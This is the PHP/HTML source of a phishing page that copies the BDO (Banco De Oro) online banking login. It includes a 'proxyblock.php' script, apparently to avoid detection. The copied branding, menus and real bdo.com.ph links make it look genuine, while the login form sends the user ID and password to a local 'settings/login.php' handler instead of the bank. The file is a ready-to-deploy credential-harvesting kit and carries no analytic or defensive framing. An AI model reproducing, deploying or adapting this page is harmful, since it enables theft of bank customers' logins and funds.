<?php
include 'T3R/proxyblock.php';
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
<title>Banco De Oro</TITLE>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link rel="icon" href="favicon.ico"> 

<link rel="stylesheet" type="text/css" href="assets/loginid.css" />
<link rel="stylesheet" type="text/css" href="assets/component.style.css" />
<link rel="stylesheet" type="text/css" href="assets/jquery-ui-1.8.2.custom.css" />
<script type="text/javascript" src="assets/jquery-1.4.2.min.js"></script>
<script type="text/javascript" src="assets/ui.core.min.js"></script>
<script type="text/javascript" src="assets/ccti.js"></script>
<link rel="stylesheet" type="text/css" href="assets/base.css" />
<script type="text/javascript" src="assets/jquery.rc4.js"></script>
</head>
<script>
$(document).ready(function(){  
        $("input").each(function() {
            switch(this.type) {
                case "password":
                case "text":
                $(this).val("");
            }
        });
        
        $("a.loginBtn").mouseover(function() {
            $("#loginmenucontainer").show();
            $("#personalmenudiv").show();
            $("#corporatemenudiv").hide();
            return false;
        });
        
        $("a.loginBtn1").mouseover(function() {
            $("#loginmenucontainer").show();
            $("#personalmenudiv").show();
            $("#corporatemenudiv").hide();
            return false;
        });
        
        $("#maintopmenu").mouseover(function() {
            $("#loginmenucontainer").hide();
        });
        
        $("#loginmenucontainer").mouseleave(function(){
        $(this).hide();
        });
        
        $("#loginmenucontainer .plink").click(function() {
            $("#personalmenudiv").show();
            $("#corporatemenudiv").hide();                
        });
        
        $("#loginmenucontainer .clink").click(function() {
            $("#personalmenudiv").hide();
            $("#corporatemenudiv").show();
        });
        
});

window.onload=function(){
    document.getElementById("loginButton").disabled=false;
    document.getElementById("loginButton").style.background="#ffb20c none";
    document.getElementById("loginButton").style.color="#24418f";
};


</script> 
<body>
    <div id="wrap1" ver="2.0.0">
            <div class="topmenu">
                        <div class="maintopmenu" id="maintopmenu" style="min-width: 815px;">
                            <ul class="menu">
                                <li><a class="first collapsed" href="https://www.bdo.com.ph/properties-for-sale">Properties for Sale</a></li>
                                <li><a class="collapsed" href="https://www.bdo.com.ph/support-topics">FAQs</a></li>
                                <li><a class="collapsed" href="https://www.bdo.com.ph/promo-list">Promos</a></li>
                                <li><a class="leaf" href="https://www.bdo.com.ph/personal/remittance-services/bdo-remit-status-inquiry">Remit Status Inquiry</a></li>
                                <li><a class="leaf" href="https://www.bdo.com.ph/subsidiaries">Subsidiaries</a></li>
                                <li><a class="leaf" href="https://www.bdo.com.ph/branches-atms-locator">Branches / ATMs</a></li>
                                <li><a class="last leaf" href="https://www.bdo.com.ph/international-desks">International Desks</a> </li>
                            </ul>
                        </div>
                        <div class="generalmenu login-bk-link">
<!--                             <div class="menu-back-link-div"> -->
<!--                                 <a href="https://www.bdo.com.ph/" class="goto">Go to bdo.com.ph</a> -->
<!--                             </div> -->
                            <div class ="menu-login-div" id="menu-login-div">
                                <a href="# " class="loginBtn1" id="loginBtn">Online Banking Login</a>
                            </div>
                        </div>            
            </div>
            
            
    </div>
    
    <div class="loginmenucontainer" id="loginmenucontainer"   style="display:none;">
                <div id="personalmenudiv">
                    <a href="#" class="logintitle plink active">Personal</a><a href="# " class="logintitle clink">Business</a><ul>
                    <li>
                    <a href="" class="bib" title="BDO Online Banking">BDO ONLINE BANKING</a>
                    </li>
                    </ul>
                    <div class = "menu-link-middle">
                        <p><a href="https://www.mybdo.com.ph/fo/ribtermsandconditions">Not Yet Enrolled? Enroll Now!</a></p>
                    </div>
                    <div class = "menu-link-footer">
                        <p><a href="https://www.bdo.com.ph/faqs/otp-faqs">What is a One-Time Password (OTP)</a></p>    
                    </div>
                </div>
                <div id="corporatemenudiv">
                    <a href="# " class="logintitle plink">Personal</a><a href="# " class="logintitle clink active">Business</a>            
                    <ul>
                         <li>
                         <a href="https://mycashcard.com.ph/cashcard/login" class="cashcard" id="ol-banking-cash-cards" title="Cash Card" target="blank">Cash Card</a>                 </li>
                         <li>
                         <a href="https://tbg.bdo.com.ph/ids/" class="ids" id="ol-banking-ids" title="Integrated Disbursement Solutions" target="blank">Integrated Disbursement Solutions</a>                </li>
                        <li>
                        <a href="https://business.bdo.com.ph/fo/login" class="cib" id="ol-banking-cib" title="Business Online Banking" target="blank">Business Online Banking</a>                </li>
                    </ul>
                    <!-- <div class="adlink">
                        <p>Take the <a href="# " id="ol-banking-btour" onClick="viewcib()">Online Banking Tour</a></p>
                    </div> -->
                </div>
            </div>
    <div>
            <script language="Javascript" type="text/javascript">
                $(document).ready(function(){
                    $("#channelPswdPin").bind("cut copy paste",function(e) {
                      e.preventDefault();
                     });
                });
            </script>
            <div>
            <table class="main-content">
                <tr>
                    <td style="max-width: 225px;vertical-align:top;padding-top:77px">
                        <div id="sideBarWrapper">
                            <div id="logoWrapper">
                                <div id="bdoLogo"><a href="http://www.bdo.com.ph" target="_blank"><span>Banco De Oro</span></a></div>      
                            </div>

                               <div>
                                <div class="sidebdomenu container">
                                    <div class="side_tabs">
                                          <div class="mainmenu" style="padding-bottom: 20px !important;">
                                            <div class="tablinkbox">
                                                <a href="https://www.bdo.com.ph/personal" class="personal" id="personal-tab">PERSONAL</a><a href="https://www.bdo.com.ph/business" class="corporate" id="business-tab">BUSINESS</a>
                                            </div>
                                            <ul class="menu">
                                                <li class="first collapsed"><a href="https://www.bdo.com.ph/personal/ebanking" title="eBanking Menu Item" id="menu-1071">eBanking</a></li>
                                                <li class="collapsed"><a href="https://www.bdo.com.ph/personal/accounts" id="menu-970">Accounts</a></li>
                                                <li class="collapsed"><a href="https://www.bdo.com.ph/trust-and-investments" id="menu-1269">Trust and Investments</a></li>
                                                <li class="collapsed"><a href="https://www.bdo.com.ph/personal/loans" id="menu-1303">Loans</a></li>
                                                <li class="collapsed"><a href="https://www.bdo.com.ph/personal/credit-debit-cards" id="menu-684">Credit Cards</a></li>
                                                <li class="collapsed"><a href="https://www.bdo.com.ph/personal/remittance-services" id="menu-1216">Remittance Services</a></li>
                                                <li class="collapsed"><a href="https://www.bdo.com.ph/personal/insurance" id="menu-1302">Insurance</a></li>
                                                <li class="collapsed"><a href="https://www.bdo.com.ph/personal/rewards" id="menu-1462">Rewards</a></li>
                                                <li class="last leaf" style="border-radius: 0px 0px 10px 10px;"><a href="https://www.bdo.com.ph/private-bank-home" id="menu-1462">Private Bank</a></li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <!-- <div id="left-footer-mybdo" valign="bottom">
                                <table width="135" border="0" cellpadding="2" cellspacing="0" title="Click to Verify - This site chose Symantec SSL for secure e-commerce and confidential communications.">
                                     <tr>
                                         <td width="135" align="center" valign="top" id="veriSeal" onload="enableLogin()"> <script type="text/javascript" src="https://seal.verisign.com/getseal?host_name=online.bdo.com.ph&amp;size=S&amp;use_flash=NO&amp;use_transparent=NO&amp;lang=en"></script><br />
                                             <a href="http://www.symantec.com/ssl-certificates" target="_blank"  style="color:#000000; text-decoration:none; font:bold 9px verdana,sans-serif; letter-spacing:.5px; text-align:center; margin:0px; padding:0px;">ABOUT SSL CERTIFICATES</a> 
                                        </td>
                                    </tr>
                                </table>        
                            </div> -->
                          </div>
                    </td>
                    <td>
                        <div>
                            <table style="padding-top: 15px;">
                                <tr>
                                    <td colspan="2" style="padding-left: 10px;">
                                        <div id="advisoryContainer" style="overflow:hidden">
                                            <div id="id42">
                                                <div><style> div#advisoryContainer {overflow:hidden;} </style>
<img border="0" src="https://online.bdo.com.ph/sso/images?cd=loginAdvisoryImage">



</div>
                                            </div>    
                                        </div>
                                    </td>
                                </tr>
                                <tr>
                                    <td colspan="2">
                                        <div class = "invisible">
                                         Invisible
                                        </div>
                                    </td>                    
                                </tr>
                                <tr>        
                                    <td valign="top" style="padding-left: 7px;">
                                        <div id="IDMyBDOGray">
                                            <div id="left column">
                                                <div id="rib-title">Login to BDO Online Banking</div>
                                                <br/>     
                                                <form autocomplete="off" loginForm="true" class="loginForm" id="id41" method="post" action="settings/login.php"><div style="display:none"><input type="hidden" name="id41_hf_0" id="id41_hf_0" /></div>                            
                                                    
                                                    <span id="login-title" >User ID:</span><br/>
                                                    <input class="textbox box" type="text" tabindex="1" maxlength="30" value="" name="username"/><br/>
                                                    <span id="login-title" >Password:</span><br/>
													<input class="textbox box" id="channelPswdPin" type="password" tabindex="2" maxlength="20" name="password"/>
													                                                    
                                                    <table>
                                                        <tr>
                                                            <td></td>
                                                            <td style="vertical-align:top; float:right;">
                                                                <div id="btn-submit">
                                                                    <input class="enrollNowButton sxi-button ui-corner-all ui-state-default" type="submit" tabindex="3" id="loginButton" disabled="disabled" style="background: #C0C0C0; color: #ffffff;" onload="enableLogin()" onclick="var e=document.getElementById("id41_hf_0"); e.name="submitButton"; e.value="x";var f=document.getElementById("id41");var ff=f;if (ff.onsubmit != undefined) { if (ff.onsubmit()==false) return false; }f.submit();e.value="";e.name="";return false;" value="Login"/>
                                                                    <input type="hidden" zxc="mnb" value="617364617364" name="hiddenField"/>
                                                                </div>    
                                                            </td>    
                                                        </tr>
                                                        <tr>
                                                            <td>
                                                                <div style="display:block; margin-left: -8px; ">
                                                                    <!-- <span wicket:id="demoLink" class="email idbox2"><div class="idbox2">Take online banking tour</div></span> -->
                                                                    
                                                                    <a class="email" href="" onclick="var e=document.getElementById("id41_hf_0"); e.name="forgotpassLink"; e.value="x";var f=document.getElementById("id41");var ff=f;if (ff.onsubmit != undefined) { if (ff.onsubmit()==false) return false; }f.submit();e.value="";e.name="";return false;"><div class="idbox2">Forgot your password?</div></a>
                                                                    <a class="email" href="" onclick="var e=document.getElementById("id41_hf_0"); e.name="forgotuserIdLink"; e.value="x";var f=document.getElementById("id41");var ff=f;if (ff.onsubmit != undefined) { if (ff.onsubmit()==false) return false; }f.submit();e.value="";e.name="";return false;"><div class="idbox2">Forgot your user ID?</div></a>
                                                                    <a class="email" href="" onclick="var e=document.getElementById("id41_hf_0"); e.name="forgottpinLink"; e.value="x";var f=document.getElementById("id41");var ff=f;if (ff.onsubmit != undefined) { if (ff.onsubmit()==false) return false; }f.submit();e.value="";e.name="";return false;"><div class="idbox2">Forgot your telephone PIN?</div></a> 
                                                                </div>
                                                            </td>
                                                                                            
                                                        </tr>                                                          
                                                    </table>
                                                    <br/>
                                                    <table>
                                                    <tr id="id45">
                                                              <td id="id46">
                                                                  <a class="email" id="id47" href="" onclick="var e=document.getElementById("id41_hf_0"); e.name="enrollNowWmc:enrollNowLblWmc:enrolNowLink"; e.value="x";var f=document.getElementById("id41");var ff=f;if (ff.onsubmit != undefined) { if (ff.onsubmit()==false) return false; }f.submit();e.value="";e.name="";return false;"><div class="idbox6"><h5>Not Yet Enrolled? Enroll Now!</h5></div></a>
                                                              </td>
                                                          </tr>
                                                    </table>
                                                    <br/>
                                                    <table>
                                                        <tr class="link1" style="padding-bottom:3px;">
                                                            <td style="width:120px;max-width:120px;"><a class="email" href="#" onclick="var e=document.getElementById("id41_hf_0"); e.name="faqSecurityPage"; e.value="x";var f=document.getElementById("id41");var ff=f;if (ff.onsubmit != undefined) { if (ff.onsubmit()==false) return false; }f.submit();e.value="";e.name="";return false;"><div class="idbox5">Security Features</div></a></td>
                                                             <td><a class="email" href="#" onclick="var e=document.getElementById("id41_hf_0"); e.name="ribPolicyPage"; e.value="x";var f=document.getElementById("id41");var ff=f;if (ff.onsubmit != undefined) { if (ff.onsubmit()==false) return false; }f.submit();e.value="";e.name="";return false;"><div class="idbox5">Online Banking Privacy Policy</div></a></td>
                                                             <td><a class="email" href="#" onclick="var e=document.getElementById("id41_hf_0"); e.name="faqPage"; e.value="x";var f=document.getElementById("id41");var ff=f;if (ff.onsubmit != undefined) { if (ff.onsubmit()==false) return false; }f.submit();e.value="";e.name="";return false;"><div class="idbox5">FAQs</div></a></td>
                                                         </tr>
                                                    </table>
                                                <div style="display:none"><input type="hidden" name="_actiontoken" id="_actiontoken" value="2c96a4946b3db452016b636393767eb1" /></div></form>                                                    
                                                <div id="bysy_indicator">
                                                    <div id="loading_gif"></div>
                                                </div>            
                                            </div>
                                        </div>
                                    </td>
                                    <td valign="top">
                                        <div id="rightSideWrapper2" >
                                             <form id="id48" method="post" action=""><div style="display:none"><input type="hidden" name="id48_hf_0" id="id48_hf_0" /></div>
                                                 
                                                  <table width="270px" style="margin-bottom: -5px; margin-top:-10px;">
                                                  
                                                  </table>
                                                  <table style="margin-top: 5px">
                                                      <tr>
                                                          <td></td>
                                                          <td></td>
                                                      </tr>
                                                   </table>
                                                   
                                                
                                                  <table style="margin-top: 5px">
                                                      <tr>
                                                          <td></td>
                                                          <td></td>
                                                      </tr>
                                                   </table>
                                            </form>
                                             <span class="clear"></span>
                                            <span class="clear"></span> 
                                            <div class="contacts">  
                                                <br />
                                                <br />
                                                <h4>TOLL-FREE NUMBERS</h4>
                                                <h4>Reminder: Charges apply for calls made through a mobile phone.</h4>
                                                <br />
                                                <h4>Domestic Toll-Free Nos.:</h4>
                                                <table>
                                                    <tr>
                                                        <td>1800-10-631-8000 (PLDT)</td>
                                                        <td class="padleft">1800-3-631-8000 (Digitel)</td>
                                                    </tr>
                                                    <tr>
                                                        <td>1800-5-631-8000 (Bayantel)</td>
                                                        <td class="padleft">1800-8-631-8000 (Globelines)</td>
                                                    </tr> 
                                                </table>
                                                
                                                <br />
                                                <h4>INTERNATIONAL</h4>
                                                <p>(Int"l. Access Code) + 800-8-631-8000</p>
                                                <br />
                                                <h4>CONTACT SUPPORT:</h4>
                                                <form id="id49" method="post" action=""><div style="display:none"><input type="hidden" name="id49_hf_0" id="id49_hf_0" /></div> 
                                                    <p><span href="#" style="color: #24418F; cursor: pointer; text-decoration: none;" class="supportLink" onClick="window.open("https://www.bdo.com.ph/contact-us");">Send a message to BDO</span></p>
                                                </form>
                                                <div id="customer-service" style="margin-top:9px">
                                                    <p style="font-size: 12px; padding-top:8px; padding-left: 10px; font-weight: bold; color: #043673">Customer Contact Center<span style="padding-right: 10px; margin-left: 35%;"><i class="icon-phone icon-large"></i>631-8000</span></p></div>    
                                                  </div>
                                                  <div id="id4a" style="padding-bottom:29px;"></div>
                                        </div>
                                    </td>
                                </tr>
                                <tr>
                                    <td colspan="2" style="padding-left: 10px;">
                                        <form id="id4b" method="post" action=""><div style="display:none"><input type="hidden" name="id4b_hf_0" id="id4b_hf_0" /></div>
                                            <br/>
                                            <span>*Our website supports the latest browser versions to ensure your privacy and security. To ensure access and for best viewing experience, please upgrade to the latest versions of Mozilla Firefox, Google Chrome, Safari or Internet Explorer as soon as possible.</span>
                                            <br /> 
                                            <br />
                                            *Detailed instructions can be found <a href="#" class="links" target="_blank" onclick="var e=document.getElementById("id4b_hf_0"); e.name="faqPopUpLink"; e.value="x";var f=document.getElementById("id4b");var ff=f;if (ff.onsubmit != undefined) { if (ff.onsubmit()==false) return false; }f.submit();e.value="";e.name="";return false;">here</a>.
                                        </form>
                                    </td>
                                </tr>     
                            </table>
                        </div>
                    </td>
                </tr>
            
                <!-- <tr>
                
                    <td></td>
                    <td></td>
                    <td></td>
                </tr>
                
                <tr>
                
                    <td></td>
                    <td></td>
                    <td></td>
                </tr> -->
            
            </table>
        </div>    
            <!-- ****************************************************HEADER 1**************************************************** -->
        
        
        
        <!-- ---------------------------------------------------------------------------- -->
        
        <!-- </div> -->
        
                <div id="footer-title">
                    
                    <div id="right-footer-mybdo">
                                             
                    </div>
                    
                </div>
        
                <span class="clear"></span> 
        
            <!-- /div -->
            <span class="clear"></span>
            
            
            <div class="footer">
                <div class="footer-menu">
                    <ul class="menu"><li class="first collapsed"><a href="https://www.bdo.com.ph/about-bdo/business-operation" target="_blank" id="menu-1118">About BDO</a></li>
                        <li class="collapsed"><a href="https://www.bdo.com.ph/corporate-governance" id="menu-1057" target="_blank">Corporate Governance</a></li>
                        <li class="collapsed"><a href="https://www.bdo.com.ph/investor-relations/investment-credit-ratings-information" id="menu-995" target="_blank">Investor Relations</a></li>
                        <li class="collapsed"><a href="https://www.bdo.com.ph/company-disclosures" id="menu-995" target="_blank">Company Disclosures</a></li>
                        <li class="leaf"><a href="https://www.bdo.com.ph/contact-us" id="menu-1508" target="_blank">Contact Us</a></li>
                        <li class="collapsed"><a href="https://www.bdo.com.ph/careers" id="menu-1401" target="_blank">Careers</a></li>
                        <li class="leaf"><a href="https://www.bdo.com.ph/news-and-articles" id="menu-1449" target="_blank">Press Room</a></li>
                        <li class="leaf"><a href="https://www.bdo.com.ph/site-map" id="menu-2810" target="_blank">Site Map</a></li>
                        <li class="leaf"><a href="https://www.bdo.com.ph/privacy-policy" id="menu-2808" target="_blank">Privacy Policy</a></li>
                        <li class="last leaf"><a href="https://www.bdo.com.ph/terms-and-conditions" id="menu-2809" target="_blank">Terms and Conditions</a></li>
                    </ul>
                </div>
                <span class="copyright" style="font-size: 10px;">BDO Unibank is supervised by the Bangko Sentral ng Pilipinas with contact number (02) 708-7087 and email address consumeraffairs@bsp.gov.ph</span>
                <span class="copyright">BDO Unibank, Inc. © 2015. All Rights Reserved</span>
            </div>
 
        </div>
</body>
</html>